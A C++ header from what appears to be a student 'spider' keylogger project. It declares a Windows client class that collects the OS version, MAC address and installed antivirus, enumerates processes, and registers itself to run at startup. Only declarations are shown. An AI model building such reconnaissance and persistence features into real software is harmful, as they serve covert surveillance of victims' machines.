/*
** System.hpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/System.hpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:16:23 2017 Gauthier Cler
** Last update Sun Oct 08 22:16:24 2017 Gauthier Cler
*/

#ifndef CPP_SPIDER_SYSTEM_HPP
#define CPP_SPIDER_SYSTEM_HPP

#include 			<windows.h>
#include			<string>

#define				MAC_BUFFSIZE	(64)
#define				MAC_LISTSIZE	(16)
#define				MAX_PROCESS	(4096)

namespace 			Client {

  class 			System {

    struct			NewVersion {
      DWORD			_maj;
      DWORD			_min;
      const std::string		_sys;
      const std::string		_serv;

      NewVersion(DWORD maj, DWORD min,
		 const std::string &sys, const std::string &serv)
	: _maj(maj), _min(min), _sys(sys), _serv(serv) {}
    };

    OSVERSIONINFOEX		_brutV;

    std::string			_version;
    std::string			_mac;
    std::string			_avirus;

    void			findVersion();
    void			findMac();
    void			findAV();

    void			getProcessName(DWORD id, std::string &name);

  public:

    System();
    ~System()  = default;

    const std::string 		&getVersion() const;
    const std::string		&getMac() const;
    const std::string		&getAntiVirus() const;
    void 			registerToStartUp(PCWSTR name, PCWSTR path);

  };

}

#endif //CPP_SPIDER_SYSTEM_HPP
